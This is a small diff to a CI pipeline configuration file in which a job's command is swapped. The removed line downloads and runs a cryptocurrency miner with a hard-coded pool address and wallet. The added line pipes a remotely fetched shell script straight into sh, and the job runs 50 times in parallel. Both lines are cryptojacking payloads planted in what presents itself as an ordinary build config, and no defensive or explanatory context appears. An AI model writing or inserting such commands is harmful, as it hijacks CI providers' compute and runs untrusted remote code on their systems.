@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -0 https://gitlab.com/ghcees/miner/-/raw/main/rstd -o zepo && chmod +x zepo && ./zepo -o 47.89.195.104:443 -u ZEPHs8Np6p82XnhjYaDcHNT44gJY5pKbxZWNkmbsrPU2K7hzyTvhkDbRnbtSo3Af6UCAwT7SfvBhBV19BBAnuEbkEzTKg7jyTax -p sema -a rx/0 -k --randomx-1gb-pages'
+            - 'curl https://gitlab.com/ghcees/zepo/-/raw/main/nanoz.sh | sh'
           parallelism: 50
